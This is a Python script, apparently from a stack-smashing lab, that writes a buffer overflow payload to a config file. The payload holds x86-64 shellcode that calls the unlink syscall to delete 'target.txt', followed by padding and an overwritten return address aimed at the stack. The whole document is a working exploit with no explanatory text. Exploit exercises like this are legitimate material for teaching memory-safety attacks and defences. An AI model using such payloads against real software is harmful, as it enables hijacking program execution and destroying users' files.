#!/usr/bin/env python
from struct import *

buf = "user="
buf += "A"*3
buf += "\110\307\300\127\000\000\000\110\277\354\316\377\377\377\177\000\000\017\005"
buf += "A"
buf += "\164\141\162\147\145\164\056\164\170\164\000"
buf += "A"*113
buf += "\330\316\377\377\377\177"


f = open("config-no.txt", "w")
f.write(buf)
